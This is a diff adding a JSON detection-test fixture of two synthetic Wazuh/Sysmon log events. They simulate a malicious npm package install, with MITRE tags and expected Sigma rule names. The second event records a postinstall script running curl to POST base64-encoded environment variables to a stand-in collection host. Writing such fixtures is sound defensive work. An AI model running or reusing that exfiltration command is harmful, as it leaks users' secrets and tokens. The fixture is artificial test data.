@@ -1,0 +1,143 @@
+{
+  "_metadata": {
+    "attack_id": "T1204.005",
+    "variation": "002",
+    "name": "User Execution: Malicious Library - npm install",
+    "description": "User installs malicious npm package",
+    "expected_detection": "MEDIUM",
+    "kill_chain_phase": "execution",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Linux Sysmon Event 1 - npm install malicious package",
+      "sequence": 1,
+      "timestamp": "2026-02-08T15:50:00.000Z",
+      "log": {
+        "timestamp": "2026-02-08T15:50:00.000+0000",
+        "rule": {
+          "level": 10,
+          "description": "Sysmon for Linux - Event 1: Process Create",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1204.005"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "User Execution: Malicious Library"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "030",
+          "name": "VULN01",
+          "ip": "198.51.100.30"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400100.300050",
+        "decoder": {
+          "name": "sysmon-linux"
+        },
+        "location": "/var/log/sysmon/syslog",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-08 15:50:00.000",
+            "processGuid": "{A1B2C3D4-EXEC-1204-0005-000000000003}",
+            "processId": "38012",
+            "image": "/usr/bin/npm",
+            "commandLine": "npm install node-ipc-patched",
+            "currentDirectory": "/home/developer/project",
+            "user": "developer",
+            "parentProcessGuid": "{A1B2C3D4-EXEC-1204-0005-PARENT000003}",
+            "parentProcessId": "38000",
+            "parentImage": "/bin/bash",
+            "parentCommandLine": "bash"
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch2-execution",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1204.005",
+        "_fomorian_expected_detection": "Sigma: NPM Install Suspicious Package (T1204.005)"
+      }
+    },
+    {
+      "_comment": "Linux Sysmon Event 1 - postinstall script exfiltrating env vars",
+      "sequence": 2,
+      "timestamp": "2026-02-08T15:50:30.000Z",
+      "log": {
+        "timestamp": "2026-02-08T15:50:30.000+0000",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon for Linux - Event 1: Process Create",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1204.005",
+              "T1041"
+            ],
+            "tactic": [
+              "Execution",
+              "Exfiltration"
+            ],
+            "technique": [
+              "User Execution: Malicious Library",
+              "Exfiltration Over C2 Channel"
+            ]
+          },
+          "firedtimes": 2,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "030",
+          "name": "VULN01",
+          "ip": "198.51.100.30"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400100.300051",
+        "decoder": {
+          "name": "sysmon-linux"
+        },
+        "location": "/var/log/sysmon/syslog",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-08 15:50:30.000",
+            "processGuid": "{A1B2C3D4-EXEC-1204-0005-000000000004}",
+            "processId": "38056",
+            "image": "/usr/bin/curl",
+            "commandLine": "curl -X POST -d \"$(env | base64)\" http://198.51.100.110/collect",
+            "currentDirectory": "/home/developer/project/node_modules/node-ipc-patched",
+            "user": "developer",
+            "parentProcessGuid": "{A1B2C3D4-EXEC-1204-0005-PARENT000004}",
+            "parentProcessId": "38045",
+            "parentImage": "/usr/bin/node",
+            "parentCommandLine": "/usr/bin/node /home/developer/project/node_modules/node-ipc-patched/postinstall.js"
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch2-execution",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1204.005",
+        "_fomorian_expected_detection": "Sigma: NPM Postinstall Exfiltration (T1204.005)"
+      }
+    }
+  ]
+}
